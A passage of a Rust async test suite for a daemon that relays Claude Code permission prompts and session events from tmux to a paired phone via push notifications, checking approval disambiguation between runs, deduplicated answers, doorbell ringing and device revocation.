        // ended and `cc-1` having restarted are indistinguishable from a name.
        daemon
            .session_exited("cc-1", Some(&live.session.uid), Some(0))
            .await;
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: None,
                event: "SessionStart".into(),
                payload: json!({"hook_event_name": "SessionStart", "cwd": "/tmp"}),
                wait: false,
            })
            .await;
        let sessions = daemon.sessions().await.unwrap();
        assert_eq!(sessions.len(), 2, "an exited run must not gain new events");
        let adopted = sessions
            .iter()
            .find(|s| s.session_uid != live.session.uid)
            .unwrap();
        assert!(protocol::uid::is_well_formed(&adopted.session_uid));
        assert_eq!(adopted.last_seq, 1);
    }

    #[tokio::test]
    async fn an_approval_answered_in_one_run_leaves_the_next_run_s_card_open() {
        // Approval safety, which is why the ledger is keyed per run: the same
        // `request_id` in a later `cc-1` must be answerable, not reported as an
        // already-applied duplicate of a decision nobody made for it.
        let daemon = test_daemon();
        let first = register(&daemon, "cc-1", Some("01K1B3XQ8ZC0DE5FGH7JKMNPQR")).await;
        daemon
            .store
            .record_answer(
                &first.session.uid,
                "toolu_shared",
                "hash",
                &AnswerOutcome {
                    request_id: "toolu_shared".into(),
                    session_id: "cc-1".into(),
                    decision: AnswerDecision::Allow,
                    resolved_by: ResolvedBy::Phone,
                    applied_via: AnswerPath::SendKeys,
                    resolved_at: protocol::time::now_rfc3339(),
                    detail: None,
                    inferred: false,
                    indeterminate: false,
                },
            )
            .unwrap();
        daemon
            .session_exited("cc-1", Some(&first.session.uid), Some(0))
            .await;

        let second = register(&daemon, "cc-1", Some("01K1B3XZZZC0DE5FGH7JKMNPQR")).await;
        assert!(
            daemon
                .store
                .get_answer(&second.session.uid, "toolu_shared")
                .unwrap()
                .is_none(),
            "the new run has answered nothing"
        );
        // Naming the new run explicitly, an answer is not a duplicate — it is
        // rejected only because there is no such card open, which is the
        // correct and *different* outcome.
        let result = daemon
            .answer(
                "toolu_shared",
                "hash",
                AnswerDecision::Allow,
                Some(&second.session.uid),
            )
            .await;
        match result {
            AnswerResult::Rejected { reason } => {
                assert!(reason.contains("unknown"), "{reason}");
            }
            other => panic!("must not resolve from another run's ledger: {other:?}"),
        }
    }

    /// Raise a `PermissionRequest` with no correlating PreToolUse, which is the
    /// normal case on this Claude build — and the one where the request id is
    /// derived from the command rather than from an agent-side identity.
    async fn uncorrelated_approval(daemon: &Arc<Daemon>, name: &str, uid: &str) -> String {
        let tool_input = json!({"command": "git status"});
        daemon
            .handle_hook(HookPost {
                session_id: name.into(),
                session_uid: Some(uid.to_string()),
                event: "PermissionRequest".into(),
                payload: json!({
                    "hook_event_name": "PermissionRequest",
                    "cwd": "/tmp",
                    "tool_name": "Bash",
                    "tool_input": tool_input,
                }),
                wait: false,
            })
            .await;
        format!(
            "pr-noprompt-{}",
            &protocol::hash::approval_payload_hash("Bash", &tool_input)[..16]
        )
    }

    #[tokio::test]
    async fn an_answer_scoped_only_by_name_is_refused_when_two_runs_share_the_card() {
        // The collision is real, not theoretical: an uncorrelated approval's
        // request id is `pr-noprompt-<hash of tool+input>`, so two runs of the
        // same command produce the same id *and* the same payload hash — which
        // means the staleness guard downstream would not catch the mix-up
        // either. Answering the wrong agent's prompt types into the wrong TTY,
        // so this must refuse rather than pick.
        let daemon = test_daemon();
        let first = register(&daemon, "cc-1", Some("01K1B3XQ8ZC0DE5FGH7JKMNPQR")).await;
        let request_id = uncorrelated_approval(&daemon, "cc-1", &first.session.uid).await;

        // A ghost: same name, same command, never observed exiting.
        let second = register(&daemon, "cc-1", Some("01K1B3XZZZC0DE5FGH7JKMNPQR")).await;
        let same_id = uncorrelated_approval(&daemon, "cc-1", &second.session.uid).await;
        assert_eq!(request_id, same_id, "the ids must actually collide");

        let hash = protocol::hash::approval_payload_hash("Bash", &json!({"command": "git status"}));
        match daemon
            .answer(&request_id, &hash, AnswerDecision::Allow, Some("cc-1"))
            .await
        {
            AnswerResult::Rejected { reason } => {
                assert!(reason.contains("more than one run"), "{reason}");
            }
            other => panic!("a name must not pick between two open cards: {other:?}"),
        }
        // …and the same refusal with no scope at all, which is the case a
        // protocol-minor-1 client hits.
        assert!(matches!(
            daemon
                .answer(&request_id, &hash, AnswerDecision::Allow, None)
                .await,
            AnswerResult::Rejected { .. }
        ));

        // Naming the run exactly is always answerable: that is what the uid is
        // for, and it is the instruction the refusal gives.
        let outcome = daemon
            .answer(
                &request_id,
                &hash,
                AnswerDecision::Allow,
                Some(&second.session.uid),
            )
            .await;
        assert!(
            !matches!(&outcome, AnswerResult::Rejected { reason } if reason.contains("more than one")),
            "a uid is unambiguous by construction: {outcome:?}"
        );
    }

    #[tokio::test]
    async fn a_name_scoped_answer_reaches_the_only_run_holding_the_card() {
        // The other half: scoping by name must keep working when there is no
        // collision, or every legacy client loses the ability to answer.
        let daemon = daemon_with(Config {
            supervisor_timeout_ms: 50,
            ..Config::default()
        });
        let session = register(&daemon, "cc-1", Some("01K1B3XQ8ZC0DE5FGH7JKMNPQR")).await;
        let request_id = uncorrelated_approval(&daemon, "cc-1", &session.session.uid).await;
        let hash = protocol::hash::approval_payload_hash("Bash", &json!({"command": "git status"}));

        // No supervisor can type, so this cannot be `Applied` — but it must
        // reach the injection attempt rather than be refused for ambiguity.
        match daemon
            .answer(&request_id, &hash, AnswerDecision::Allow, Some("cc-1"))
            .await
        {
            AnswerResult::Rejected { reason } => {
                assert!(
                    !reason.contains("more than one") && !reason.contains("unknown"),
                    "the card was reachable; it failed at injection: {reason}"
                );
            }
            other => panic!("unexpected: {other:?}"),
        }
        // A name nobody has ever used is still an honest error.
        assert!(matches!(
            daemon.answer(&request_id, &hash, AnswerDecision::Allow, Some("cc-9")).await,
            AnswerResult::Rejected { reason } if reason.contains("unknown session")
        ));
    }

    #[tokio::test]
    async fn concurrent_taps_on_one_card_produce_one_outcome_not_a_rejection() {
        // A duplicate must return the original outcome. Before this was
        // serialised, a second tap arriving *during* the first one's injection
        // got `Rejected{already being applied}` — which a phone on a flaky link
        // renders as a failure for an answer that did apply.
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, &permission_pane("echo hi"), "").await;
        let card = raise_prompt(&daemon, uid, "p1", "echo hi").await;
        assert!(wait_bound(&daemon, uid, &card).await);
        let hash = protocol::hash::approval_payload_hash("Bash", &json!({"command": "echo hi"}));

        let mut tasks = Vec::new();
        for _ in 0..8 {
            let daemon = Arc::clone(&daemon);
            let (card, hash) = (card.clone(), hash.clone());
            tasks.push(tokio::spawn(async move {
                daemon
                    .answer(&card, &hash, AnswerDecision::Allow, Some(TEST_UID))
                    .await
            }));
        }
        let mut results = Vec::new();
        for task in tasks {
            results.push(task.await.unwrap());
        }
        assert!(
            !results.iter().any(|r| matches!(
                r,
                AnswerResult::Rejected { reason } if reason.contains("already being applied")
            )),
            "a racing duplicate must never be told the answer is in flight: {results:?}"
        );

        // Exactly one reaches the agent and the rest replay it — the durable
        // claim is what makes that true even for a tap that lands *during* the
        // injection, which is the case a ledger check alone cannot catch.
        let applied: Vec<&AnswerOutcome> = results
            .iter()
            .filter_map(|r| match r {
                AnswerResult::Applied { outcome } => Some(outcome),
                _ => None,
            })
            .collect();
        assert_eq!(
            applied.len(),
            1,
            "exactly one answer may be typed: {results:?}"
        );
        let duplicates = results
            .iter()
            .filter(|r| matches!(r, AnswerResult::Duplicate { .. }))
            .count();
        assert_eq!(duplicates, 7, "{results:?}");
        assert_eq!(
            pane.typed(),
            vec!["1".to_string()],
            "eight taps, one keystroke"
        );
    }

    // ------------------------------------------------------- hook mapping

    #[tokio::test]
    async fn the_stop_hook_records_a_turn_not_a_session_end() {
        let daemon = test_daemon();
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.to_string()),
                event: "Stop".into(),
                payload: json!({"hook_event_name": "Stop", "session_id": "uuid", "cwd": "/tmp"}),
                wait: false,
            })
            .await;
        let events = daemon.store.events_after(TEST_UID, 0, 10).unwrap();
        let kinds: Vec<&EventKind> = events.iter().map(|e| &e.kind).collect();
        assert!(kinds.contains(&&EventKind::TurnComplete), "{kinds:?}");
        assert!(
            !kinds.contains(&&EventKind::SessionEnd),
            "a finished turn is not a finished session: {kinds:?}"
        );
    }

    #[tokio::test]
    async fn a_real_session_end_still_reports_session_end() {
        let daemon = test_daemon();
        // The run has to exist before it can end: an exit reported for a session
        // nobody registered is a bug to log, not an event to invent.
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.to_string()),
                event: "SessionStart".into(),
                payload: json!({"hook_event_name": "SessionStart", "cwd": "/tmp"}),
                wait: false,
            })
            .await;
        daemon.session_exited("cc-1", Some(TEST_UID), Some(0)).await;
        let kinds: Vec<EventKind> = daemon
            .store
            .events_after(TEST_UID, 0, 10)
            .unwrap()
            .into_iter()
            .map(|e| e.kind)
            .collect();
        assert!(kinds.contains(&EventKind::SessionEnd), "{kinds:?}");
    }

    #[tokio::test]
    async fn an_exit_for_a_session_this_daemon_never_saw_is_dropped() {
        // The half of the defect that lives here: with no row for the run, the
        // exit has nothing to attach to and is discarded. This is the *before*
        // state, asserted so the fix below is visibly a fix and not a
        // coincidence — a session that started and ended while ccd was down
        // vanished entirely, and there was no evidence anywhere that an agent
        // had run at all.
        let daemon = test_daemon();
        daemon.session_exited("cc-9", Some(TEST_UID), Some(0)).await;
        assert!(
            daemon
                .store
                .events_after(TEST_UID, 0, 10)
                .unwrap()
                .is_empty(),
            "an unknown session has nowhere to record an exit"
        );
        assert!(daemon.sessions().await.unwrap().is_empty());
    }

    #[tokio::test]
    async fn a_session_that_began_and_ended_while_the_daemon_was_down_still_lands() {
        // What the supervisor now does on that same connection: replay its
        // registration, *then* report the exit. The daemon has never heard of
        // this run — no `SessionStart`, no hook, no prior registration — and it
        // still ends up in the fleet with a terminal `SessionEnd`.
        let daemon = test_daemon();
        let registration = register(&daemon, "cc-9", Some(TEST_UID)).await;
        assert_eq!(registration.session.uid, TEST_UID);
        daemon.session_exited("cc-9", Some(TEST_UID), Some(0)).await;

        let kinds: Vec<EventKind> = daemon
            .store
            .events_after(TEST_UID, 0, 10)
            .unwrap()
            .into_iter()
            .map(|event| event.kind)
            .collect();
        assert!(
            kinds.contains(&EventKind::SessionEnd),
            "the run's end must be a durable fact: {kinds:?}"
        );
        let sessions = daemon.sessions().await.unwrap();
        assert_eq!(sessions.len(), 1, "the run must appear in the fleet");
        assert_eq!(sessions[0].session_uid, TEST_UID);
        assert_eq!(
            daemon
                .store
                .get_session(TEST_UID)
                .unwrap()
                .unwrap()
                .lifecycle,
            Lifecycle::Exited,
        );
    }

    // -------------------------------------------------- liveness sweep

    /// A liveness oracle that answers from a script instead of from tmux.
    ///
    /// The sweep's *policy* is what these tests are about — which rows are
    /// candidates, how much evidence an exit takes, what is left alone — and a
    /// test that drove it through a real tmux server could only fail on a
    /// machine where tmux happened to misbehave. Reading tmux is tested against
    /// the real binary in [`crate::liveness`] and [`protocol::tmux`]; what
    /// happens to an answer is tested here.
    struct ScriptedPresence {
        /// Answers per tmux name, consumed in order. The last one repeats, so
        /// "gone, then gone for ever" is one entry and "gone, then not" is two.
        script: std::sync::Mutex<
            HashMap<String, std::collections::VecDeque<protocol::tmux::SessionPresence>>,
        >,
        fallback: protocol::tmux::SessionPresence,
        asked: std::sync::Mutex<Vec<String>>,
        owners: std::sync::Mutex<HashMap<String, String>>,
    }

    impl ScriptedPresence {
        fn always(presence: protocol::tmux::SessionPresence) -> ScriptedPresence {
            ScriptedPresence {
                script: std::sync::Mutex::new(HashMap::new()),
                fallback: presence,
                asked: std::sync::Mutex::new(Vec::new()),
                owners: std::sync::Mutex::new(HashMap::new()),
            }
        }

        /// A name whose answers change between looks.
        fn then(self, name: &str, answers: Vec<protocol::tmux::SessionPresence>) -> Self {
            self.script
                .lock()
                .unwrap()
                .insert(name.to_string(), answers.into());
            self
        }

        /// Which run tmux says is holding a name, as `show-environment` would
        /// report it. A name with no entry answers as an unstamped session — the
        /// legacy case, and the default every other test in this file exercises.
        fn held_by(self, name: &str, uid: &str) -> Self {
            self.owners
                .lock()
                .unwrap()
                .insert(name.to_string(), uid.to_string());
            self
        }

        fn asked(&self) -> Vec<String> {
            self.asked.lock().unwrap().clone()
        }
    }

    impl crate::liveness::Presence for ScriptedPresence {
        async fn presence(&self, target: &crate::liveness::Target) -> crate::liveness::Sighting {
            self.asked.lock().unwrap().push(target.name.clone());
            let presence = {
                let mut script = self.script.lock().unwrap();
                match script.get_mut(&target.name) {
                    Some(queue) if queue.len() > 1 => queue.pop_front().unwrap(),
                    Some(queue) => queue.front().cloned().unwrap(),
                    None => self.fallback.clone(),
                }
            };
            // Only a session that is there can have an owner, which is exactly
            // what tmux does: `show-environment` against a name nothing holds
            // fails with "no such session" and says nothing about identity.
            let owner = match presence {
                protocol::tmux::SessionPresence::Present => Some(
                    self.owners
                        .lock()
                        .unwrap()
                        .get(&target.name)
                        .map(|uid| protocol::tmux::SessionOwner::Uid(uid.clone()))
                        .unwrap_or(protocol::tmux::SessionOwner::Unstamped),
                ),
                _ => None,
            };
            crate::liveness::Sighting { presence, owner }
        }
    }

    /// A session row with no supervisor and no events — exactly the shape a
    /// restart inherits from the process before it.
    fn seed_session(daemon: &Arc<Daemon>, uid: &str, name: &str, lifecycle: Lifecycle) {
        let now = protocol::time::now_rfc3339();
        daemon
            .store
            .upsert_session(&SessionRow {
                session_uid: uid.into(),
                session_id: name.into(),
                tmux_session: name.into(),
                tmux_socket: protocol::TMUX_SOCKET_NAME.into(),
                cwd: "/tmp".into(),
                claude_session_id: None,
                transcript_path: None,
                lifecycle,
                created_at: now.clone(),
                updated_at: now,
            })
            .unwrap()
            .assert_present();
    }

    fn lifecycle_of(daemon: &Arc<Daemon>, uid: &str) -> Lifecycle {
        daemon.store.get_session(uid).unwrap().unwrap().lifecycle
    }

    fn kinds_of(daemon: &Arc<Daemon>, uid: &str) -> Vec<EventKind> {
        daemon
            .store
            .events_after(uid, 0, 100)
            .unwrap()
            .into_iter()
            .map(|event| event.kind)
            .collect()
    }

    /// A daemon whose pushes land in a vec instead of APNs, each with the
    /// exclusion list it carried — the probe for the doorbell tests below.
    struct CaptureSender(
        std::sync::Mutex<Vec<(crate::apns::PushHint, Vec<String>)>>,
        /// Devices the daemon told the sender to retire.
        std::sync::Mutex<Vec<String>>,
    );
    impl crate::apns::PushSender for CaptureSender {
        fn send(&self, hint: &crate::apns::PushHint, excluded: &[String]) {
            self.0
                .lock()
                .unwrap()
                .push((hint.clone(), excluded.to_vec()));
        }
        fn retire(&self, device_id: &str) {
            self.1.lock().unwrap().push(device_id.to_string());
        }
    }

    fn capture_daemon() -> (Arc<Daemon>, Arc<CaptureSender>) {
        capture_daemon_on(shared_store())
    }

    /// The same, over a store that already exists — so a test can express "ccd
    /// was killed and came back" and watch what the new one rings about.
    fn capture_daemon_on(store: Arc<Store>) -> (Arc<Daemon>, Arc<CaptureSender>) {
        let capture = Arc::new(CaptureSender(
            std::sync::Mutex::new(Vec::new()),
            std::sync::Mutex::new(Vec::new()),
        ));
        let (tx, rx) = mpsc::unbounded_channel();
        Box::leak(Box::new(rx));
        let daemon = Daemon::new(
            Config::default(),
            store,
            Arc::clone(&capture) as Arc<dyn crate::apns::PushSender>,
            Endpoint {
                host: "test.ts.net".into(),
                port: 8787,
                tls: false,
            },
            tx,
        );
        (daemon, capture)
    }

    /// A quiet-state notification the way Claude's hook posts it.
    fn quiet_hook(kind: &str, msg: &str) -> HookPost {
        HookPost {
            session_id: "cc-1".into(),
            session_uid: Some(TEST_UID.into()),
            event: "Notification".into(),
            payload: json!({
                "hook_event_name": "Notification",
                "notification_type": kind,
                "message": msg,
                "cwd": "/tmp",
            }),
            wait: false,
        }
    }

    /// The doorbell's full contract, through the real hook path: no agent
    /// text in the payload (the notification `message` routinely names files
    /// and commands and was once copied verbatim into the APNs alert), one
    /// ring per quiet state however often Claude re-announces it, and no ring
    /// for a device whose live socket already carried the fact.
    #[tokio::test]
    async fn the_doorbell_rings_once_skips_watchers_and_carries_no_agent_text() {
        let (daemon, capture) = capture_daemon();

        // A phone was watching live: its socket has delivered past anything
        // this test ingests, so the seen-filter must exclude it at dispatch.
        daemon
            .push_gate
            .note_delivered("watching-phone", TEST_UID, 1_000);

        daemon
            .handle_hook(quiet_hook(
                "agent_needs_input",
                "I need /Users/alice/secrets/deploy_key.pem to continue",
            ))
            .await;
        // Claude re-announces the same wait; the ambient latch owes silence.
        daemon
            .handle_hook(quiet_hook("idle_prompt", "still waiting"))
            .await;
        // Dispatch runs behind a short grace so in-flight socket writes can
        // record themselves first; the assertions must outwait it.
        tokio::time::sleep(Duration::from_millis(700)).await;

        let rings = capture.0.lock().unwrap();
        assert_eq!(rings.len(), 1, "one quiet state, one ring: {rings:?}");
        let (hint, excluded) = &rings[0];
        assert_eq!(hint.kind.sentence(), "Waiting for your input");
        assert!(
            !format!("{hint:?}").contains("deploy_key"),
            "nothing the agent wrote may reach the APNs payload"
        );
        assert_eq!(
            excluded,
            &vec!["watching-phone".to_string()],
            "the device that saw it live must not be rung"
        );
    }

    /// The ambient latch through the real hook path: repeating the same quiet
    /// state is silence, but *movement* — a tool starting, or the quiet state
    /// changing class — reopens the bell. One ring per thing that happened,
    /// not one per time Claude announced it.
    #[tokio::test]
    async fn the_doorbell_reopens_on_progress_and_on_state_change() {
        let (daemon, capture) = capture_daemon();

        let wait = || quiet_hook("agent_needs_input", "waiting");
        let done = || quiet_hook("agent_completed", "all done");
        daemon.handle_hook(wait()).await; // gated — then superseded below
        daemon.handle_hook(wait()).await; // latched: same wait again
        tool_call(&daemon, "cc-1", TEST_UID, "toolu_p1").await; // progress
        daemon.handle_hook(wait()).await; // rings: waiting again after movement
        daemon.handle_hook(done()).await; // rings: state changed class
        daemon.handle_hook(done()).await; // latched: same completion again
        daemon.handle_hook(wait()).await; // rings: changed class back

        tokio::time::sleep(Duration::from_millis(700)).await;
        // Dispatch grace makes near-simultaneous rings race each other to the
        // sender, so assert the multiset of bodies, not their order.
        //
        // The *first* wait never rings: the tool call lands inside its
        // dispatch grace, and a push whose wait ended before it left the
        // building is exactly the stale ring the ticket check exists to drop.
        let mut bodies: Vec<String> = capture
            .0
            .lock()
            .unwrap()
            .iter()
            .map(|(hint, _)| hint.kind.sentence().to_string())
            .collect();
        bodies.sort();
        assert_eq!(
            bodies,
            vec![
                "Finished a turn".to_string(),
                "Waiting for your input".to_string(),
                "Waiting for your input".to_string(),
            ],
            "a superseded wait stays silent; every surviving change rings once"
        );
    }

    /// A pending card, hand-built: the state it represents — one run holding a
    /// second decision while its first is claimed — is not reachable through
    /// the hooks.
    fn pending_card(uid: &str, label: &str) -> PendingApproval {
        PendingApproval {
            card: serde_json::from_value(json!({
                "request_id": "r", "payload_hash": "h", "tool_name": "Bash",
                "tool_input": {}, "display_text": "echo hi"
            }))
            .unwrap(),
            session: SessionKey::new(uid, "cc-1"),
            project_label: label.into(),
            created_ms: 0,
            responder: None,
            claimed: false,
            local_misses: 0,
            tool_ran: false,
            generation: 0,
            prompt: None,
        }
    }

    /// Two cards on one run are one agent, and the run is named once.
    /// Unreachable through hooks alone — it takes a claimed card the
    /// superseding sweep left standing — so the rule is pinned where it lives
    /// rather than left to an arrangement no test can build.
    #[test]
    fn two_decisions_on_one_run_are_one_agent() {
        let mut inner = Inner::default();
        for request in ["r-1", "r-2"] {
            inner.pending.insert(
                (TEST_UID.to_string(), request.to_string()),
                pending_card(TEST_UID, "Aion"),
            );
        }
        inner.pending.insert(
            ("other-run".to_string(), "r-3".to_string()),
            pending_card("other-run", "Ledger"),
        );

        let mut blocked = blocked_runs(&inner);
        blocked.sort();
        assert_eq!(
            blocked,
            vec![
                (TEST_UID.to_string(), "Aion".to_string()),
                ("other-run".to_string(), "Ledger".to_string())
            ],
            "two cards on one run are one agent, named once"
        );
        assert!(blocked_runs(&Inner::default()).is_empty());
    }

    /// **A run that moves takes its open cards with it.**
    ///
    /// The label is captured with the card so that composing a doorbell needs
    /// no database read. A later hook can carry a different `cwd`, and the
    /// fleet redraws from the row — so a card still holding the old name would
    /// put one name on a lock screen and a different one on the list behind it.
    #[tokio::test]
    async fn a_card_is_named_by_where_its_run_is_now() {
        let (daemon, capture) = capture_daemon();
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.into()),
                event: "PermissionRequest".into(),
                payload: json!({
                    "hook_event_name": "PermissionRequest",
                    "cwd": "/srv/dev/before",
                    "prompt_id": "p-1",
                    "tool_name": "Bash",
                    "tool_input": { "command": "echo hi" },
                }),
                wait: false,
            })
            .await;
        tokio::time::sleep(Duration::from_millis(700)).await;
        capture.0.lock().unwrap().clear();

        // The run moves: an ordinary hook carrying a different `cwd`.
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.into()),
                event: "PreToolUse".into(),
                payload: json!({
                    "hook_event_name": "PreToolUse",
                    "tool_name": "Read",
                    "tool_input": { "file_path": "/srv/dev/after/x" },
                    "cwd": "/srv/dev/after",
                }),
                wait: false,
            })
            .await;
        daemon
            .handle_hook(HookPost {
                session_id: "cc-2".into(),
                session_uid: Some("01K1B3XQ8ZC0DE5FGH7JKMNPQS".into()),
                event: "Notification".into(),
                payload: json!({
                    "hook_event_name": "Notification",
                    "notification_type": "agent_completed",
                    "message": "done",
                    "cwd": "/srv/dev/other",
                }),
                wait: false,
            })
            .await;

        tokio::time::sleep(Duration::from_millis(700)).await;
        let rings = capture.0.lock().unwrap();
        let (hint, _) = rings.last().expect("the completion rings");
        assert_eq!(
            hint.project_label, "after",
            "the card wears the run's current project, not the one it was filed in: {rings:?}"
        );
    }

    /// **The supervisor is a cwd writer too.** A run that reconnects from a
    /// different directory moves, and a card it is holding has to move with it
    /// — or the doorbell names one project while the fleet names another.
    #[tokio::test]
    async fn a_supervisor_reconnecting_elsewhere_relabels_the_cards_it_holds() {
        let (daemon, capture) = capture_daemon();
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.into()),
                event: "PermissionRequest".into(),
                payload: json!({
                    "hook_event_name": "PermissionRequest",
                    "cwd": "/srv/dev/before",
                    "prompt_id": "p-1",
                    "tool_name": "Bash",
                    "tool_input": { "command": "echo hi" },
                }),
                wait: false,
            })
            .await;
        tokio::time::sleep(Duration::from_millis(700)).await;
        capture.0.lock().unwrap().clear();

        // The run's supervisor registers from somewhere else.
        let (tx, rx) = mpsc::channel(protocol::config::Config::default().ipc_write_queue);
        Box::leak(Box::new(rx));
        daemon
            .register_supervisor(
                RegisterSession {
                    session_id: "cc-1".to_string(),
                    session_uid: Some(TEST_UID.to_string()),
                    tmux_session: "cc-1".to_string(),
                    tmux_socket: protocol::TMUX_SOCKET_NAME.to_string(),
                    cwd: "/srv/dev/after".to_string(),
                    supervisor_pid: 4242,
                    claude_bin: None,
                    started_at: protocol::time::now_rfc3339(),
                    protocol_minor: protocol::PROTOCOL_MINOR,
                },
                tx,
                Arc::new(std::sync::Mutex::new(HashMap::new())),
            )
            .await
            .expect("the supervisor registers");

        // Another run finishes a turn, so the doorbell has to name the blocked
        // one — and it names it by where that run is now.
        daemon
            .handle_hook(HookPost {
                session_id: "cc-2".into(),
                session_uid: Some("01K1B3XQ8ZC0DE5FGH7JKMNPQS".into()),
                event: "Notification".into(),
                payload: json!({
                    "hook_event_name": "Notification",
                    "notification_type": "agent_completed",
                    "message": "done",
                    "cwd": "/srv/dev/other",
                }),
                wait: false,
            })
            .await;
        tokio::time::sleep(Duration::from_millis(700)).await;

        let rings = capture.0.lock().unwrap();
        let (hint, _) = rings.last().expect("the completion rings");
        assert_eq!(
            hint.project_label, "after",
            "the card moved with the run its supervisor re-registered: {rings:?}"
        );
    }

    /// **A phone that re-pairs takes its token with it.** The store moves an
    /// APNs token to the row that just registered it, so the row it came from
    /// holds work for a token it no longer owns — and a worker waiting on a
    /// phone that has already come back under another name.
    #[tokio::test]
    async fn re_registering_a_token_retires_the_row_it_was_taken_from() {
        let (daemon, capture) = capture_daemon();
        async fn pair(daemon: &Arc<Daemon>) -> String {
            let (code, _) = daemon.create_pairing(300).await.unwrap();
            match hello_with_code(daemon, &code).await {
                AuthOutcome::Paired { device_id, .. } => device_id,
                other => panic!("pairing must succeed: {other:?}"),
            }
        }
        let first = pair(&daemon).await;
        let second = pair(&daemon).await;

        daemon
            .register_push(&first, "tok-shared", "production", None)
            .await
            .unwrap();
        assert!(
            capture.1.lock().unwrap().is_empty(),
            "nothing is displaced by the first registration"
        );

        daemon
            .register_push(&second, "tok-shared", "production", None)
            .await
            .unwrap();
        assert_eq!(
            *capture.1.lock().unwrap(),
            vec![first],
            "the row the token was taken from is retired with it"
        );
    }

    /// **Revoking a device retires its push queue with it.**
    ///
    /// The queue holds work authorised before the revocation, and behind it a
    /// worker that would otherwise wait on a phone that is never coming back.
    /// Retirement is *told*, not inferred from a later send: if nothing rings
    /// again, an inference never happens.
    #[tokio::test]
    async fn revoking_a_device_retires_the_queue_holding_its_pushes() {
        let _home = redirected_home("revoke-pushes");
        let (daemon, capture) = capture_daemon();
        let (code, _) = daemon.create_pairing(300).await.unwrap();
        let AuthOutcome::Paired { device_id, .. } = hello_with_code(&daemon, &code).await else {
            panic!("pairing must succeed");
        };
        assert!(capture.1.lock().unwrap().is_empty(), "nothing retired yet");

        daemon.revoke(&device_id).await.unwrap();
        assert_eq!(
            *capture.1.lock().unwrap(),
            vec![device_id],
            "the sender is told the device is gone, at the moment it goes"
        );
    }

    /// **The doorbell names the run it is about, through the real path.**
    ///
    /// `aion` is holding a decision when `ledger` finishes a turn. One slot
    /// means `ledger`'s doorbell has to speak for the fleet — and titling it
    /// `ledger` would send the reader to the wrong project to look for a card
    /// that is not there.
    #[tokio::test]
    async fn the_doorbell_that_speaks_for_the_fleet_names_the_blocked_run() {
        let (daemon, capture) = capture_daemon();
        let blocked_uid = "01K1B3XQ8ZC0DE5FGH7JKMNPQR";
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(blocked_uid.into()),
                event: "PermissionRequest".into(),
                payload: json!({
                    "hook_event_name": "PermissionRequest",
                    "cwd": "/srv/dev/aion",
                    "prompt_id": "p-1",
                    "tool_name": "Bash",
                    "tool_input": { "command": "echo hi" },
                }),
                wait: false,
            })
            .await;
        // Past the decision's own grace, so what follows is counted alone.
        tokio::time::sleep(Duration::from_millis(700)).await;
        capture.0.lock().unwrap().clear();

        daemon
            .handle_hook(HookPost {
                session_id: "cc-2".into(),
                session_uid: Some("01K1B3XQ8ZC0DE5FGH7JKMNPQS".into()),
                event: "Notification".into(),
                payload: json!({
                    "hook_event_name": "Notification",
                    "notification_type": "agent_completed",
                    "message": "done",
                    "cwd": "/srv/dev/ledger",
                }),
                wait: false,
            })
            .await;

        tokio::time::sleep(Duration::from_millis(700)).await;
        let rings = capture.0.lock().unwrap();
        let (hint, _) = rings.first().expect("the completion rings");
        assert_eq!(
            (hint.kind, hint.project_label.as_str()),
            (crate::apns::PushKind::Approval, "aion"),
            "the decision's project, not the run that happened to ring: {rings:?}"
        );
    }

    /// **A decision the daemon inherited from its own restart still rings.**
    ///
    /// Cards are durable; the push gate is memory-only by design. So after a
    /// restart the decision is in the database with its prompt key unclaimed,
    /// and the `permission_prompt` Claude repeats is the first thing to admit
    /// it — as a decision, because the card is right there.
    ///
    /// The run then does something ordinary: a tool starts. That records
    /// progress, which is exactly what cancels a *quiet-state* push waiting out
    /// its grace. A decision is not a quiet state. If progress cancels it, the
    /// reader is never told about a card that is still on their screen and
    /// still on the agent's.
    #[tokio::test]
    async fn a_decision_recovered_from_a_restart_survives_the_run_moving() {
        let store = shared_store();
        let before = daemon_on(Arc::clone(&store), Config::default());
        raise_prompt(&before, TEST_UID, "p-open", "echo hi").await;

        let (daemon, capture) = capture_daemon_on(store);
        daemon.recover().await;
        assert!(
            daemon.has_pending_card(TEST_UID, "p-open").await,
            "the run-up: the restarted daemon holds the card"
        );

        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.into()),
                event: "Notification".into(),
                payload: json!({
                    "hook_event_name": "Notification",
                    "notification_type": "permission_prompt",
                    "message": "Claude needs your permission to use Bash",
                    "prompt_id": "p-open",
                    "cwd": "/tmp",
                }),
                wait: false,
            })
            .await;
        // A tool starts while the card waits — the run moved.
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.into()),
                event: "PreToolUse".into(),
                payload: json!({
                    "hook_event_name": "PreToolUse",
                    "tool_name": "Read",
                    "tool_input": { "file_path": "/tmp/x" },
                    "cwd": "/tmp",
                }),
                wait: false,
            })
            .await;

        tokio::time::sleep(Duration::from_millis(700)).await;
        let rings = capture.0.lock().unwrap();
        let kinds: Vec<_> = rings.iter().map(|(h, _)| h.kind).collect();
        assert_eq!(
            kinds,
            vec![crate::apns::PushKind::Approval],
            "a card that is still open still rings, whatever else the run does: {rings:?}"
        );
    }

    /// **The badge is a count of runs, read at the moment of ringing.**
    ///
    /// The sentence says "agents", so the number has to be agents. Asserting it
    /// on a hand-made hint would only re-check the composer's arithmetic; this
    /// drives two runs to a decision each and reads the count off the hint the
    /// daemon actually sent. Both say two: the second run blocked while the
    /// first doorbell was still inside its dispatch grace, and a doorbell
    /// describes the fleet it is about to interrupt someone for.
    #[tokio::test]
    async fn the_badge_counts_the_runs_that_are_blocked() {
        let (daemon, capture) = capture_daemon();
        raise_prompt_in(&daemon, "cc-1", TEST_UID, "p-a", "echo a").await;
        raise_prompt_in(
            &daemon,
            "cc-2",
